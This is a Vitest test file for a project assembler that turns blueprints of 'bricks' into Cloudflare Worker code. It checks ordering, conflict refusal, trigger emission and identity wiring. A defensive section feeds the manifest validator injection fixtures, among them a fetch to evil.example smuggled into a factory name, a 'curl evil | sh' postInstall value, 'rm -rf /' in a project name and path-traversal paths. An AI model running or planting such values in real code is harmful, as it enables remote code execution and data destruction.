import { describe, expect, test, vi } from "vitest";
import { assemble, hashFiles } from "../src/index.ts";
import type { Catalog } from "../src/index.ts";
import { catalog } from "../catalog.generated.ts";
import { INVOICE_FLOW_BLUEPRINT, TWO_BRICK_BLUEPRINT } from "../../../test/support/blueprints.ts";

const twoBricks = { project: "invoice-flow", bricks: ["multi-workspace", "credit-wallet"] };
const files = (input: unknown, c: Catalog = catalog) => {
  const result = assemble(input, c);
  if (!result.ok) throw new Error(result.errors.join("; "));
  return result;
};
const errors = (input: unknown, c: Catalog = catalog) => {
  const result = assemble(input, c);
  if (result.ok) throw new Error("expected the assembly to be refused");
  return result.errors;
};

describe("the two-brick blueprint", () => {
  test("produces exactly the expected files, in sorted order", () => {
    const result = files(twoBricks);
    expect(Object.keys(result.files)).toEqual([
      "migrations/0001_multi-workspace__0001_multi_workspace.sql",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql",
      "openapi.json",
      "package.json",
      "project.json",
      "src/identity.stub.ts",
      "src/index.ts",
      "src/privacy.generated.ts",
      "wrangler.jsonc",
    ]);
    expect(result.order).toEqual(["multi-workspace", "credit-wallet"]);
  });

  test("two runs give identical files, byte for byte", () => {
    expect(JSON.stringify(files(twoBricks).files)).toBe(JSON.stringify(files(twoBricks).files));
  });

  test("the order the blueprint lists the bricks in does not change the project", () => {
    const reversed = { project: "invoice-flow", bricks: ["credit-wallet", "multi-workspace"] };
    expect(JSON.stringify(files(reversed).files)).toBe(JSON.stringify(files(twoBricks).files));
  });

  test("the workspace guard is mounted in front of the wallet's routes, and the wallet needs it", () => {
    const entry = files(twoBricks).files["src/index.ts"]!;
    const guard = entry.indexOf('app.use("/api/wallet", workspaceMiddleware);');
    expect(guard).toBeGreaterThan(-1);
    for (const path of ["/api/wallet", "/api/wallet/*", "/api/payments/create-order"]) expect(entry).toContain(`app.use("${path}", workspaceMiddleware);`);
    expect(entry.indexOf("app.use(\"/api/*\", stubIdentity)")).toBeLessThan(guard);
    expect(guard).toBeLessThan(entry.indexOf("createWalletRoutes({"));
    // Story 0.9: no payment gateway is wired by default; the fake is for tests that inject it.
    expect(entry).toContain('import { createWalletRoutes } from "@poc/credit-wallet";');
    expect(entry).not.toContain("createFakeGateway");
    expect(entry).toContain('import { createWorkspaceRoutes, workspaceMiddleware } from "@poc/multi-workspace";');
  });

  test("the migrations are in dependency order and are the bricks' own text", () => {
    const result = files(twoBricks);
    expect(result.files["migrations/0001_multi-workspace__0001_multi_workspace.sql"]).toContain("CREATE TABLE IF NOT EXISTS mw_workspaces");
    expect(result.files["migrations/0002_credit-wallet__0001_credit_wallet.sql"]).toContain("CREATE TABLE IF NOT EXISTS credit_wallets");
    expect(result.files["migrations/0002_credit-wallet__0001_credit_wallet.sql"]).toBe(catalog.bricks["credit-wallet"]!.files["migrations/0001_credit_wallet.sql"]);
  });

  test("defaults and chosen settings reach the emitted code", () => {
    expect(files(twoBricks).files["src/index.ts"]).toContain("creditsPerUnit: 1, minOrderAmount: 1");
    const configured = { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: 10, minOrderAmount: 100 } }] };
    const entry = files(configured).files["src/index.ts"]!;
    expect(entry).toContain("creditsPerUnit: 10, minOrderAmount: 100");
    expect(JSON.parse(files(configured).files["project.json"]!).bricks[1].settings).toEqual({ creditsPerUnit: 10, minOrderAmount: 100 });
  });

  test("the emitted JSON files parse, and the project name and the database name agree", () => {
    const result = files(twoBricks);
    const wrangler = JSON.parse(result.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler).toMatchObject({ name: "invoice-flow", main: "src/index.ts", d1_databases: [{ binding: "DB", database_name: "invoice-flow", migrations_dir: "migrations" }] });
    expect(JSON.parse(result.files["package.json"]!)).toMatchObject({ name: "invoice-flow", dependencies: { "@poc/credit-wallet": "workspace:*", "@poc/multi-workspace": "workspace:*", hono: "4.13.19", zod: "4.6.7" } });
    expect(JSON.parse(result.files["project.json"]!).migrations).toHaveLength(3);
  });

  test("the identity stub is in the project and says it is a stub", () => {
    expect(files(twoBricks).files["src/identity.stub.ts"]).toMatch(/STUB IDENTITY/);
    expect(files(twoBricks).files["src/index.ts"]).toContain("STUB IDENTITY (proof only)");
  });

  test("one brick on its own assembles when it needs nothing", () => {
    const result = files({ project: "p", bricks: ["multi-workspace"] });
    expect(Object.keys(result.files).filter((f) => f.startsWith("migrations/"))).toHaveLength(1);
    expect(result.files["src/index.ts"]).not.toContain("createWalletRoutes");
  });
});

describe("assembly is pure", () => {
  test("it reads no clock and no random source", () => {
    const now = vi.spyOn(Date, "now").mockImplementation(() => {
      throw new Error("the assembler read the clock");
    });
    const random = vi.spyOn(Math, "random").mockImplementation(() => {
      throw new Error("the assembler used Math.random");
    });
    const uuid = vi.spyOn(globalThis.crypto, "randomUUID").mockImplementation(() => {
      throw new Error("the assembler made a random id");
    });
    try {
      expect(assemble(twoBricks, catalog).ok).toBe(true);
    } finally {
      now.mockRestore();
      random.mockRestore();
      uuid.mockRestore();
    }
  });

  test("it does not change its inputs", () => {
    const deepFreeze = <T>(value: T): T => {
      if (typeof value === "object" && value !== null) {
        Object.freeze(value);
        for (const inner of Object.values(value)) deepFreeze(inner);
      }
      return value;
    };
    const frozenCatalog = deepFreeze(structuredClone(catalog));
    const blueprint = deepFreeze(structuredClone({ project: "p", bricks: ["credit-wallet", { id: "multi-workspace", config: {} }] }));
    expect(assemble(blueprint, frozenCatalog).ok).toBe(true);
  });
});

describe("a blueprint that cannot be assembled is refused with a reason that names the problem", () => {
  test.each([
    ["an unknown brick", { project: "p", bricks: ["multi-workspace", "no-such-brick"] }, new RegExp(`unknown brick "no-such-brick" \\(available: ${Object.keys(catalog.bricks).sort().join(", ")}\\)`)],
    ["a brick listed twice", { project: "p", bricks: ["multi-workspace", "multi-workspace"] }, /"multi-workspace" is listed more than once/],
    ["the wallet without the workspace brick", { project: "p", bricks: ["credit-wallet"] }, /credit-wallet requires "workspace-context", which no enabled brick provides \(enable one of: multi-workspace\)/],
    ["an unknown setting", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditPerUnit: 2 } }] }, /credit-wallet: unknown setting "creditPerUnit" \(known: creditsPerUnit, minOrderAmount\)/],
    ["a setting of the wrong type", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: "ten" } }] }, /setting "creditsPerUnit" must be a whole number from 1 to 1000000/],
    ["a setting below its minimum", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: 0 } }] }, /setting "creditsPerUnit" must be a whole number/],
    ["a fractional setting", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { minOrderAmount: 1.5 } }] }, /setting "minOrderAmount" must be a whole number/],
    ["a setting of the wrong kind of value", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { minOrderAmount: true } }] }, /setting "minOrderAmount" must be a whole number/],
    ["a setting on a brick that has none", { project: "p", bricks: [{ id: "multi-workspace", config: { x: 1 } }] }, /multi-workspace: unknown setting "x" \(known: none\)/],
  ])("%s", (_label, blueprint, message) => {
    expect(errors(blueprint).join("\n")).toMatch(message);
  });

  test.each([
    ["no bricks", { project: "p", bricks: [] }],
    ["no project name", { bricks: ["multi-workspace"] }],
    ["a project name that is a path", { project: "../escape", bricks: ["multi-workspace"] }],
    ["a project name with a quote", { project: 'p"; rm -rf /', bricks: ["multi-workspace"] }],
    ["a project name in capitals", { project: "Invoice", bricks: ["multi-workspace"] }],
    ["a project name over 40 characters", { project: "a".repeat(41), bricks: ["multi-workspace"] }],
    ["an identity other than the stub", { project: "p", bricks: ["multi-workspace"], identity: "jwt" }],
    ["a key the blueprint does not define", { project: "p", bricks: ["multi-workspace"], owner: "bob" }],
    ["a brick id with a path in it", { project: "p", bricks: ["../multi-workspace"] }],
    ["not an object", "multi-workspace"],
    ["null", null],
  ])("%s is refused by the blueprint check", (_label, blueprint) => {
    const result = assemble(blueprint, catalog);
    expect(result.ok).toBe(false);
  });

  test("every problem is reported at once, not only the first", () => {
    const list = errors({ project: "p", bricks: ["credit-wallet", "ghost", { id: "credit-wallet", config: {} }] });
    expect(list.length).toBeGreaterThanOrEqual(2);
  });

  test("rejects declared conflicting brick pairs in the catalog", () => {
    expect(
      errors({
        project: "p",
        bricks: ["multi-workspace", "document-parsing", "document-pdf"],
      }).join("\n"),
    ).toBe("conflict: document-parsing × document-pdf: Both export route factory createDocumentRoutes in the documents domain");

    expect(
      errors({
        project: "p",
        bricks: ["multi-workspace", "outbound-webhooks", "subscription-plans"],
      }).join("\n"),
    ).toBe("conflict: outbound-webhooks × subscription-plans: Both mount routes under the /api/subscriptions prefix");
  });
});

// The manifest is data the assembler turns into source text, so it is checked as hostile input. The synthetic bricks
// below stand in for bricks that do not exist yet; they test the ordering and refusal logic that the two real bricks
// (one depends on the other, nothing deeper) cannot.
const brick = (id: string, extra: Partial<Catalog["bricks"][string]["manifest"]> = {}, files: Record<string, string> = {}): Catalog["bricks"][string] => ({
  manifest: { manifestVersion: 2, kind: "brick", id, version: "1.0.0", trust: "first-party", isolation: "none", provides: [], requires: [], migrations: [], routePrefixes: [], npmDependencies: {}, settings: {}, worker: { package: `@x/${id}`, routes: [] }, ...extra },
  files,
});
const catalogOf = (...bricks: Array<Catalog["bricks"][string]>): Catalog => ({ bricks: Object.fromEntries(bricks.map((b) => [b.manifest.id, b])) });

describe("ordering and refusal with synthetic bricks", () => {
  const chain = catalogOf(
    brick("alpha", { requires: ["cap-b"], migrations: ["migrations/a.sql"] }, { "migrations/a.sql": "-- a" }),
    brick("bravo", { provides: ["cap-b"], requires: ["cap-c"], migrations: ["migrations/b.sql"] }, { "migrations/b.sql": "-- b" }),
    brick("charlie", { provides: ["cap-c"], migrations: ["migrations/c.sql"] }, { "migrations/c.sql": "-- c" }),
  );

  test("a chain is mounted from the deepest provider outwards, whatever order it was listed in", () => {
    for (const listed of [["alpha", "bravo", "charlie"], ["charlie", "alpha", "bravo"], ["bravo", "charlie", "alpha"]]) {
      const result = files({ project: "p", bricks: listed }, chain);
      expect(result.order).toEqual(["charlie", "bravo", "alpha"]);
      expect(Object.keys(result.files).filter((f) => f.startsWith("migrations/"))).toEqual([
        "migrations/0001_charlie__c.sql",
        "migrations/0002_bravo__b.sql",
        "migrations/0003_alpha__a.sql",
      ]);
    }
  });

  test("bricks with no dependency between them are ordered by id", () => {
    const c = catalogOf(brick("zulu"), brick("mike"), brick("echo"));
    expect(files({ project: "p", bricks: ["zulu", "mike", "echo"] }, c).order).toEqual(["echo", "mike", "zulu"]);
  });

  test("a dependency cycle is refused and names the bricks", () => {
    const c = catalogOf(brick("one", { provides: ["cap-1"], requires: ["cap-2"] }), brick("two", { provides: ["cap-2"], requires: ["cap-1"] }));
    expect(errors({ project: "p", bricks: ["one", "two"] }, c).join()).toMatch(/cycle: one, two/);
  });

  test("two bricks providing the same capability are refused", () => {
    const c = catalogOf(brick("left", { provides: ["cap-x"] }), brick("right", { provides: ["cap-x"] }));
    expect(errors({ project: "p", bricks: ["left", "right"] }, c).join()).toMatch(/"cap-x" is provided by both left and right/);
  });

  test("two bricks declaring a conflict are refused with conflict: <a> × <b>: <reason>", () => {
    const c = catalogOf(
      brick("alpha", { conflicts: [{ brick: "bravo", reason: "Both mount /api/shared" }] }),
      brick("bravo"),
    );
    expect(errors({ project: "p", bricks: ["bravo", "alpha"] }, c)).toEqual([
      "conflict: alpha × bravo: Both mount /api/shared",
    ]);
  });

  test("a brick that provides a capability it also requires does not wait on itself", () => {
    const c = catalogOf(brick("self", { provides: ["cap-s"], requires: ["cap-s"] }));
    expect(files({ project: "p", bricks: ["self"] }, c).order).toEqual(["self"]);
  });

  test("two bricks that need different versions of a package are refused", () => {
    const c = catalogOf(brick("one", { npmDependencies: { hono: "4.13.13" } }), brick("two", { npmDependencies: { hono: "4.12.0" } }));
    expect(errors({ project: "p", bricks: ["one", "two"] }, c).join()).toMatch(/hono is needed at 4.13.13 and at 4.12.0/);
  });

  test("a brick that lists a migration the catalog does not hold is refused", () => {
    const c = catalogOf(brick("lost", { migrations: ["migrations/missing.sql"] }));
    expect(errors({ project: "p", bricks: ["lost"] }, c).join()).toMatch(/lost lists migration migrations\/missing.sql, which is not in the catalog/);
  });

  test("a capability offered without a guard cannot guard a route", () => {
    const c = catalogOf(
      brick("offers", { provides: ["cap-g"] }),
      brick("uses", { requires: ["cap-g"], worker: { package: "@x/uses", routes: [{ factory: "makeRoutes", mountAt: "/api", options: {}, guardPaths: ["/api/x"], guardWith: "cap-g" }] } }),
    );
    expect(errors({ project: "p", bricks: ["offers", "uses"] }, c).join()).toMatch(/uses guards makeRoutes with "cap-g", but offers offers that capability without a guard to mount/);
  });

  test("the emitted code for a synthetic brick uses only what its manifest declares", () => {
    const c = catalogOf(
      brick("guarded", { provides: ["cap-g"], worker: { package: "@x/guarded", guard: { export: "guardIt", capability: "cap-g" }, routes: [] } }),
      brick("routes", {
        requires: ["cap-g"],
        settings: { limit: { type: "integer", min: 1, max: 9, default: 3 } },
        worker: { package: "@x/routes", routes: [{ factory: "makeRoutes", mountAt: "/api/things", options: { limit: { $setting: "limit" }, label: "hello", on: true, store: { $call: "makeStore" } }, guardPaths: ["/api/things"], guardWith: "cap-g" }] },
      }),
    );
    const entry = files({ project: "p", bricks: ["routes", "guarded"] }, c).files["src/index.ts"]!;
    expect(entry).toContain('import { guardIt } from "@x/guarded";');
    expect(entry).toContain('import { makeRoutes, makeStore } from "@x/routes";');
    expect(entry).toContain('app.use("/api/things", guardIt);');
    expect(entry).toContain('app.route("/api/things", makeRoutes({ limit: 3, label: "hello", on: true, store: makeStore() }));');
  });
});

describe("a manifest cannot smuggle code into the emitted project", () => {
  const withRoute = (route: Record<string, unknown>) =>
    ({ manifestVersion: 2, kind: "brick", id: "evil", version: "1.0.0", trust: "first-party", provides: [], requires: [], migrations: [], npmDependencies: {}, settings: {}, worker: { package: "@x/evil", routes: [route] } }) as never;
  const parse = async (manifest: unknown) => (await import("../src/schemas.ts")).ManifestSchema.safeParse(manifest).success;

  test.each([
    ["a factory name that ends the call and starts another", { factory: "x); fetch('https://evil.example'); (y", mountAt: "/api" }],
    ["a mount path that closes the string", { factory: "x", mountAt: '/api"); evil(); ("' }],
    ["a mount path with a space", { factory: "x", mountAt: "/api /x" }],
    ["a $call that is not an identifier", { factory: "x", mountAt: "/api", options: { a: { $call: "x(); y" } } }],
    ["an option name that is not an identifier", { factory: "x", mountAt: "/api", options: { "a: evil()": 1 } }],
    ["a $setting that names nothing declared", { factory: "x", mountAt: "/api", options: { a: { $setting: "ghost" } } }],
    ["a guard path with a newline", { factory: "x", mountAt: "/api", guardWith: "cap", guardPaths: ["/a\nevil()"] }],
    ["guard paths without a capability", { factory: "x", mountAt: "/api", guardPaths: ["/api/x"] }],
  ])("%s is refused", async (_label, route) => {
    expect(await parse(withRoute(route))).toBe(false);
  });

  test.each([
    ["a package name with a quote", { worker: { package: '@x/evil"', routes: [] } }],
    ["a package name that climbs out", { worker: { package: "../evil", routes: [] } }],
    ["a migration path that climbs out", { migrations: ["../../secrets.sql"] }],
    ["a migration that is not SQL", { migrations: ["migrations/run.sh"] }],
    ["a dependency at a range, not an exact version", { npmDependencies: { hono: "^4.0.0" } }],
    ["a brick id in capitals", { id: "Evil" }],
    ["an unknown key", { postInstall: "curl evil | sh" }],
    ["a v1 manifest without manifestVersion", { manifestVersion: undefined }],
    ["a v1 manifest with manifestVersion 1", { manifestVersion: 1 }],
    ["a manifest with wrong kind", { kind: "node-pack" }],
    ["a ui summary over 140 characters", { ui: { displayName: "Valid Name", category: "billing", summary: "a".repeat(141) } }],
    ["a ui category outside the closed enum", { ui: { displayName: "Valid Name", category: "unknown-cat", summary: "Short summary." } }],
    ["a ui behaviourTest with path traversal", { ui: { displayName: "Valid Name", category: "billing", summary: "Short summary.", behaviourTest: "../escape.test.ts" } }],
    ["a trigger handler that is not an identifier", { triggers: { schedules: [{ id: "tick", cron: "* * * * *", handler: "run(); evil" }] } }],
    ["a conflict brick id that is invalid", { conflicts: [{ brick: "../evil", reason: "Bad id" }] }],
  ])("%s is refused", async (_label, change) => {
    const base = { manifestVersion: 2, kind: "brick", id: "evil", version: "1.0.0", trust: "first-party", provides: [], requires: [], migrations: [], npmDependencies: {}, settings: {}, worker: { package: "@x/evil", routes: [] } };
    expect(await parse({ ...base, ...change })).toBe(false);
  });

  test("accepts valid v2 ui, triggers, conflicts, bindings, secrets and globalTables blocks", async () => {
    const valid = {
      manifestVersion: 2,
      kind: "brick",
      id: "sample-brick",
      version: "1.0.0",
      trust: "first-party",
      provides: [],
      requires: [],
      migrations: [],
      npmDependencies: {},
      settings: {},
      ui: {
        displayName: "Sample Brick",
        category: "billing",
        summary: "Handles billing operations within 140 chars.",
        maturity: "production",
        behaviourTest: "test/sample.test.ts",
      },
      triggers: {
        schedules: [{ id: "every-min", cron: "* * * * *", handler: "runTick" }],
        queues: [{ id: "job-queue", handler: "handleBatch", maxBatch: 10, dlq: true }],
      },
      conflicts: [{ brick: "other-brick", reason: "Shares the same route table." }],
      bindings: { BUCKET: "r2" },
      secrets: ["API_SECRET_KEY"],
      globalTables: [{ table: "global_lookup", reason: "Shared reference table across all workspaces." }],
      worker: { package: "@x/sample-brick", routes: [] },
    };
    expect(await parse(valid)).toBe(true);
  });
});

describe("triggers emission and byte-identical baseline when no triggers are declared (AC 1)", () => {
  test("TWO_BRICK_BLUEPRINT and INVOICE_FLOW_BLUEPRINT emit byte-identical files and hashes when no triggers are present", async () => {
    const twoBrickHashes = await hashFiles(files(TWO_BRICK_BLUEPRINT).files);
    expect(twoBrickHashes).toEqual({
      "migrations/0001_multi-workspace__0001_multi_workspace.sql": "44330d96d93fc7c48c859437e2f78c3ec8daea0381cfab30c94fa80cb0bcaaef",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql": "29c4056af349d76717f8a1777b58e5bfc09838af60e676f96051a811e3571bfc",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql": "6274abf0fb0de6ab68cf97d00ccf245cbb67fa0f7a319b5012e60cbec682bead",
      "openapi.json": "c77c2e7c33606f6a369cf1b1a90809da38adaa3a5145d15159f30fb704c49487",
      "package.json": "24d1388075ec69744a13f379f37b38441588d2cdb511352eb58f6ab9d0e1a946",
      "project.json": "5b8c1fe06258acce8605ebec6665dc1cf1a206a5a67044034f412e142e95420c",
      "src/identity.stub.ts": "f6f7e26885eca9904d03068a7f72620808ab584ee1a66c8b41af7e04fd3907f3",
      "src/index.ts": "79f81479dedf49609975fa7114ddf59f32eee6d7f49e7c0121054eae0e9508ae",
      "src/privacy.generated.ts": "a029b2ce67225928903d85b59be098fd44f1d04384f286178f42a3715d19d396",
      "wrangler.jsonc": "d678c83f4dd70ff4bfc1dc7e2e75953a9a8d0e0216061d82308bd562c1f4625b",
    });

    const invoiceFlowHashes = await hashFiles(files(INVOICE_FLOW_BLUEPRINT).files);
    expect(invoiceFlowHashes).toEqual({
      "migrations/0001_multi-workspace__0001_multi_workspace.sql": "44330d96d93fc7c48c859437e2f78c3ec8daea0381cfab30c94fa80cb0bcaaef",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql": "29c4056af349d76717f8a1777b58e5bfc09838af60e676f96051a811e3571bfc",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql": "6274abf0fb0de6ab68cf97d00ccf245cbb67fa0f7a319b5012e60cbec682bead",
      "migrations/0004_entity__invoices.sql": "43c67676212cbfd376e0479b1fe3e955c054eb127b09e84ad0922012e1a445ff",
      "openapi.json": "fc78a27cbc505836cef15723d4c63e5feed04a53f4071a2ef1f7868d8a7fe902",
      "package.json": "95f5732b726396206cd43cc4916b7dcd19b5519f4c31ba4ac0996a1a3edb8e4f",
      "project.json": "6b40796c6e70e6dbd00431753a2bec1888725ba24254655d2e4ea764b6c16a2d",
      "src/entities.json": "5b153446783e693c0ada62b9c2626071e38f3e3e9bb047dd5a3a39c24179ba0a",
      "src/identity.stub.ts": "f6f7e26885eca9904d03068a7f72620808ab584ee1a66c8b41af7e04fd3907f3",
      "src/index.ts": "edb8e28c2a94e36c4bcfcfdb9c090f782c1edf24312598936dd6b1da22cf50d9",
      "src/privacy.generated.ts": "5c0f6d193d3f6d332a415d2cfa7b9e571bdf3b6ca71f8ae177e053227170e804",
      "wrangler.jsonc": "d7c0046626c2da81eca662bc64f38619da75b0d48f4978b1dc37ecf5eb8c3c0b",
    });
  });

  test("emits one Cron Trigger (* * * * *), px_schedules migration,scheduled() dispatcher, queue bindings, and queue(batch) dispatcher when bricks declare triggers", () => {
    const c = catalogOf(
      brick(
        "sched-brick",
        {
          migrations: ["migrations/0001_sched.sql"],
          triggers: {
            schedules: [
              { id: "sweep-a", cron: "*/5 * * * *", handler: "handleSweepA" },
              { id: "sweep-b", cron: "0 * * * *", handler: "handleSweepB" },
            ],
          },
        },
        { "migrations/0001_sched.sql": "-- sched" },
      ),
      brick("queue-brick", {
        triggers: {
          queues: [
            { id: "alpha-jobs", handler: "consumeAlpha", maxBatch: 15, dlq: true },
            { id: "beta-jobs", handler: "consumeBeta", maxBatch: 5, dlq: false },
          ],
        },
      }),
    );

    const out = files({ project: "triggered-app", bricks: ["sched-brick", "queue-brick"] }, c);
    expect(Object.keys(out.files).filter((k) => k.startsWith("migrations/"))).toEqual([
      "migrations/0001_sched-brick__0001_sched.sql",
      "migrations/0002_shell__px_schedules.sql",
    ]);
    expect(out.files["migrations/0002_shell__px_schedules.sql"]).toContain("CREATE TABLE IF NOT EXISTS px_schedules");

    const wrangler = JSON.parse(out.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.triggers).toEqual({ crons: ["* * * * *"] });
    expect(wrangler.queues).toEqual({
      producers: [
        { binding: "ALPHA_JOBS", queue: "alpha-jobs" },
        { binding: "BETA_JOBS", queue: "beta-jobs" },
      ],
      consumers: [
        { queue: "alpha-jobs", max_batch_size: 15, dead_letter_queue: "alpha-jobs-dlq" },
        { queue: "beta-jobs", max_batch_size: 5 },
      ],
    });

    const entry = out.files["src/index.ts"]!;
    expect(entry).toContain('import { handleSweepA, handleSweepB } from "@x/sched-brick";');
    expect(entry).toContain('import { consumeAlpha, consumeBeta } from "@x/queue-brick";');
    expect(entry).toContain("FROM px_schedules WHERE active = 1 AND datetime(next_run_at) <= datetime(?)");
    expect(entry).toContain("AND next_run_at = ?");
    expect(entry).toContain('case "alpha-jobs":');
    expect(entry).toContain('case "beta-jobs":');
    expect(entry).toContain("fetch: app.fetch,");
    expect(entry).toContain("scheduled,");
    expect(entry).toContain("queue,");
  });

  test("refuses two bricks that declare the same queue id", () => {
    const c = catalogOf(
      brick("left", { triggers: { queues: [{ id: "shared-q", handler: "runLeft", maxBatch: 10, dlq: true }] } }),
      brick("right", { triggers: { queues: [{ id: "shared-q", handler: "runRight", maxBatch: 10, dlq: true }] } }),
    );
    expect(errors({ project: "p", bricks: ["left", "right"] }, c)).toEqual([
      'queue "shared-q" is declared by both left and right; enable only one',
    ]);
  });

  test("pluggable identity mounts core-auth sessionMiddleware or any custom user-identity brick guard, and refuses invalid identity configs", () => {
    const coreAuthOut = files({
      project: "authed-app",
      identity: "core-auth",
      bricks: ["multi-workspace", "core-auth"],
    });
    expect(coreAuthOut.files["src/identity.stub.ts"]).toBeUndefined();
    expect(coreAuthOut.files["src/index.ts"]).not.toContain("stubIdentity");
    expect(coreAuthOut.files["src/index.ts"]).toContain('import { createAuthRoutes, sessionMiddleware } from "@poc/core-auth";');
    expect(coreAuthOut.files["src/index.ts"]).toContain('app.use("/api/*", sessionMiddleware);');
    expect(JSON.parse(coreAuthOut.files["project.json"]!).identity).toBe("core-auth");

    // Refuses identity: "core-auth" when core-auth is not enabled in bricks
    expect(
      errors({
        project: "authed-app",
        identity: "core-auth",
        bricks: ["multi-workspace"],
      }),
    ).toEqual(['identity "core-auth" requires brick "core-auth" to be enabled in bricks']);

    // Refuses an enabled brick that does not provide user-identity
    expect(
      errors({
        project: "authed-app",
        identity: "multi-workspace",
        bricks: ["multi-workspace"],
      }),
    ).toEqual(['identity "multi-workspace" does not provide "user-identity"']);

    // Supports any custom brick that provides user-identity and declares a worker.guard (D8)
    const customCatalog = catalogOf(
      brick("custom-auth", {
        provides: ["user-identity"],
        worker: {
          package: "@x/custom-auth",
          guard: { export: "customAuthGuard", capability: "user-identity" },
          routes: [{ factory: "createCustomAuthRoutes", mountAt: "/api", options: {}, guardPaths: [] }],
        },
      }),
    );
    const customOut = files({ project: "custom-app", identity: "custom-auth", bricks: ["custom-auth"] }, customCatalog);
    expect(customOut.files["src/index.ts"]).toContain('import { createCustomAuthRoutes, customAuthGuard } from "@x/custom-auth";');
    expect(customOut.files["src/index.ts"]).toContain('app.use("/api/*", customAuthGuard);');
  });
});

describe("conditional INTEGRATION_BLOBS R2 binding emission (AC4)", () => {
  const binaryCatalog: Catalog = {
    ...catalog,
    integrations: {
      ...catalog.integrations,
      storage: {
        manifest: {
          app: "storage",
          name: "Storage Service",
          version: "1.0.0",
          operations: [
            {
              operationId: "downloadPdf",
              description: "Download PDF",
              method: "GET",
              path: "/files/pdf",
              response: { binary: true, contentType: "application/pdf" },
            },
            {
              operationId: "uploadMultipart",
              description: "Upload file",
              method: "POST",
              path: "/files/upload",
              body: { contentType: "multipart/form-data" },
            },
            {
              operationId: "uploadStream",
              description: "Stream octet",
              method: "POST",
              path: "/files/stream",
              body: { contentType: "application/octet-stream" },
            },
            {
              operationId: "getJsonData",
              description: "Get JSON data",
              method: "GET",
              path: "/files/meta",
              response: { binary: false, contentType: "application/json" },
            },
          ],
        } as any,
        nodes: [],
      },
    },
  };

  test("emits INTEGRATION_BLOBS R2 bucket binding in wrangler.jsonc when graph has binary response operation", () => {
    const bp = {
      project: "proj-binary-res",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-download",
          name: "Download Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.downloadPdf",
              data: { operationId: "downloadPdf" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toEqual([
      { binding: "INTEGRATION_BLOBS", bucket_name: "proj-binary-res-blobs" },
    ]);
  });

  test("emits INTEGRATION_BLOBS R2 bucket binding in wrangler.jsonc when graph has binary request content-type", () => {
    const bp = {
      project: "proj-binary-req",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-upload",
          name: "Upload Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.uploadMultipart",
              data: { operationId: "uploadMultipart" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toEqual([
      { binding: "INTEGRATION_BLOBS", bucket_name: "proj-binary-req-blobs" },
    ]);
  });

  test("omits r2_buckets and INTEGRATION_BLOBS from wrangler.jsonc when graph has only non-binary operations", () => {
    const bp = {
      project: "proj-non-binary",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-meta",
          name: "Meta Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.getJsonData",
              data: { operationId: "getJsonData" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toBeUndefined();
    expect(res.files["wrangler.jsonc"]).not.toContain("INTEGRATION_BLOBS");
  });

  test("omits r2_buckets and INTEGRATION_BLOBS from wrangler.jsonc when blueprint has no workflows", () => {
    const bp = {
      project: "proj-no-wf",
      bricks: ["multi-workspace"],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toBeUndefined();
    expect(res.files["wrangler.jsonc"]).not.toContain("INTEGRATION_BLOBS");
  });
});

